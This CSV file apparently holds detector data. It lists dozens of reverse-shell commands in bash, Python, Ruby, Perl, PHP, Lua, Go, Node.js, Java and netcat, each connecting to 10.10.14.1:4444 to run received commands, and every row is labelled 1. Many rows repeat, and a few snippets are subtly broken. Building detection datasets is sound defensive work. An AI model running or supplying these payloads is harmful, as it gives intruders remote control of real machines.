"command","label"
"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);cmd=URI.decode(cmd);IO.popen(cmd,""r""){|io|c.print URI.encode(io.read)}end'",1
"python3 -c 'import socket,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=base64.b64decode(d).decode();p=os.popen(c);s.send(base64.b64encode(p.read().encode()))'",1
"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'",1
"lua -e 'local s=require(""socket"").udp();s:setpeername(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(require(""zlib"").compress(o));end'",1
"package main;import(""net"";""os/exec"";""encoding/base64"");func main(){c,_:=net.Dial(""udp"",""10.10.14.1:4444"");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=base64.StdEncoding.DecodeString(string(b[:n]));out,_:=exec.Command(""bash"",""-c"",string(cmd)).Output();c.Write([]byte(base64.StdEncoding.EncodeToString(out)))}}",1
"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(d.toString(),(e,o)=>s.write(Buffer.from(o))))",1
"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|xxd -r -p|bash >&3 2>&3;done'",1
"python3 -c 'import socket,os,zlib;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=zlib.decompress(d).decode();p=os.popen(c);s.send(zlib.compress(p.read().encode()))'",1
"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(base64_decode($c),$o);foreach($o as $l){fwrite($s,base64_encode($l));}}'",1
"nc -u 10.10.14.1 4444 -e /bin/bash | base64 | nc -u 10.10.14.1 4445",1
"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(""10.10.14.1"",4444);Process p=Runtime.getRuntime().exec(""/bin/bash"");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}",1
"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'",1
"perl -e 'use Socket;socket(S,PF_INET,SOCK_DGRAM,getprotobyname(""udp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));while(<S>){chomp;system($_);}'",1
"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);cmd=[cmd].pack(""H*"").chomp;IO.popen(cmd,""r""){|io|c.print io.read.unpack(""H*"")[0]}end'",1
"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'",1
"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'",1
"lua -e 'local s=require(""socket"").tcp();s:connect(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(require(""zlib"").compress(o));end'",1
"package main;import(""net"";""os/exec"";""encoding/hex"");func main(){c,_:=net.Dial(""udp"",""10.10.14.1:4444"");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=hex.DecodeString(string(b[:n]));out,_:=exec.Command(""bash"",""-c"",string(cmd)).Output();c.Write([]byte(hex.EncodeToString(out)))}}",1
"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(require('zlib').inflateSync(Buffer.from(d.toString(),'base64')).toString(),(e,o)=>s.write(Buffer.from(require('zlib').deflateSync(o).toString('base64')))))",1
"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|base64 -d|bash >&3 2>&3;done'",1
"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'",1
"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(urldecode($c),$o);foreach($o as $l){fwrite($s,urlencode($l));}}'",1
"nc 10.10.14.1 4444 -e /bin/bash | xxd -p | nc 10.10.14.1 4445",1
"import java.net.*;import java.io.*;import java.util.zip.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(""10.10.14.1"",4444);Process p=Runtime.getRuntime().exec(""/bin/sh"");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}",1
"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'",1
"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/bash -i"");'",1
"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);cmd=URI.decode(cmd);IO.popen(cmd,""r""){|io|c.print URI.encode(io.read)}end'",1
"python3 -c 'import socket,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=base64.b64decode(d).decode();p=os.popen(c);s.send(base64.b64encode(p.read().encode()))'",1
"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'",1
"lua -e 'local s=require(""socket"").udp();s:setpeername(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(require(""zlib"").compress(o));end'",1
"package main;import(""net"";""os/exec"";""encoding/base64"");func main(){c,_:=net.Dial(""tcp"",""10.10.14.1:4444"");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=base64.StdEncoding.DecodeString(string(b[:n]));out,_:=exec.Command(""bash"",""-c"",string(cmd)).Output();c.Write([]byte(base64.StdEncoding.EncodeToString(out)))}}",1
"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(d.toString(),(e,o)=>s.write(Buffer.from(o))))",1
"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|xxd -r -p|bash >&3 2>&3;done'",1
"python3 -c 'import socket,os,zlib;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=zlib.decompress(d).decode();p=os.popen(c);s.send(zlib.compress(p.read().encode()))'",1
"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(base64_decode($c),$o);foreach($o as $l){fwrite($s,base64_encode($l));}}'",1
"nc -u 10.10.14.1 4444 -e /bin/bash | base64 | nc -u 10.10.14.1 4445",1
"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(""10.10.14.1"",4444);Process p=Runtime.getRuntime().exec(""/bin/bash"");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}",1
"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'",1
"perl -e 'use Socket;socket(S,PF_INET,SOCK_DGRAM,getprotobyname(""udp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));while(<S>){chomp;system($_);}'",1
"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);cmd=[cmd].pack(""H*"").chomp;IO.popen(cmd,""r""){|io|c.print io.read.unpack(""H*"")[0]}end'",1
"python3 -c 'import socket,os,urllib.parse;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=urllib.parse.unquote(d);p=os.popen(c);s.send(urllib.parse.quote(p.read()).encode())'",1
"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'",1
"lua -e 'local s=require(""socket"").tcp();s:connect(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(o);end'",1
"package main;import(""net"";""os/exec"";""encoding/hex"");func main(){c,_:=net.Dial(""tcp"",""10.10.14.1:4444"");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=hex.DecodeString(string(b[:n]));out,_:=exec.Command(""bash"",""-c"",string(cmd)).Output();c.Write([]byte(hex.EncodeToString(out)))}}",1
"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(require('zlib').inflateSync(Buffer.from(d.toString(),'base64')).toString(),(e,o)=>s.write(Buffer.from(require('zlib').deflateSync(o).toString('base64')))))",1
"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|base64 -d|bash >&3 2>&3;done'",1
"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'",1
"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(urldecode($c),$o);foreach($o as $l){fwrite($s,urlencode($l));}}'",1
"nc 10.10.14.1 4444 -e /bin/bash | xxd -p | nc 10.10.14.1 4445",1
"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(""10.10.14.1"",4444);Process p=Runtime.getRuntime().exec(""/bin/sh"");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}",1
"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'",1
"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/bash -i"");'",1
"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);cmd=URI.decode(cmd);IO.popen(cmd,""r""){|io|c.print URI.encode(io.read)}end'",1
"python3 -c 'import socket,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=base64.b64decode(d).decode();p=os.popen(c);s.send(base64.b64encode(p.read().encode()))'",1
"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'",1
"lua -e 'local s=require(""socket"").udp();s:setpeername(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(require(""zlib"").compress(o));end'",1
"package main;import(""net"";""os/exec"";""encoding/base64"");func main(){c,_:=net.Dial(""tcp"",""10.10.14.1:4444"");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=base64.StdEncoding.DecodeString(string(b[:n]));out,_:=exec.Command(""bash"",""-c"",string(cmd)).Output();c.Write([]byte(base64.StdEncoding.EncodeToString(out)))}}",1
"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(require('zlib').inflateSync(Buffer.from(d.toString(),'base64')).toString(),(e,o)=>s.write(Buffer.from(require('zlib').deflateSync(o).toString('base64')))))",1
"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|base64 -d|bash >&3 2>&3;done'",1
"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'",1
"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(urldecode($c),$o);foreach($o as $l){fwrite($s,urlencode($l));}}'",1
"nc 10.10.14.1 4444 -e /bin/bash | xxd -p | nc 10.10.14.1 4445",1
"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(""10.10.14.1"",4444);Process p=Runtime.getRuntime().exec(""/bin/bash"");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}",1
"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'",1
"perl -e 'use Socket;socket(S,PF_INET,SOCK_DGRAM,getprotobyname(""udp""));connect(S,sockaddr_in(4444,inet_aton(""10.10.14.1"")));while(<S>){chomp;system($_);}'",1
"ruby -rsocket -e 'c=TCPSocket.new(""10.10.14.1"",4444);while(cmd=c.gets);cmd=[cmd].pack(""H*"").chomp;IO.popen(cmd,""r""){|io|c.print io.read.unpack(""H*"")[0]}end'",1
"python3 -c 'import socket,os,urllib.parse;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=urllib.parse.unquote(d);p=os.popen(c);s.send(urllib.parse.quote(p.read()).encode())'",1
"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'",1
"lua -e 'local s=require(""socket"").tcp();s:connect(""10.10.14.1"",4444);while true do local c=s:receive();local f=io.popen(c,""r"");local o=f:read(""*a"");f:close();s:send(o);end'",1
"package main;import(""net"";""os/exec"";""encoding/hex"");func main(){c,_:=net.Dial(""tcp"",""10.10.14.1:4444"");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=hex.DecodeString(string(b[:n]));out,_:=exec.Command(""bash"",""-c"",string(cmd)).Output();c.Write([]byte(hex.EncodeToString(out)))}}",1
"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(require('zlib').inflateSync(Buffer.from(d.toString(),'base64')).toString(),(e,o)=>s.write(Buffer.from(require('zlib').deflateSync(o).toString('base64')))))",1
"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|base64 -d|bash >&3 2>&3;done'",1
"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.1"",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'",1
"php -r '$s=fsockopen(""10.10.14.1"",4444);while($c=fgets($s)){exec(urldecode($c),$o);foreach($o as $l){fwrite($s,urlencode($l));}}'",1
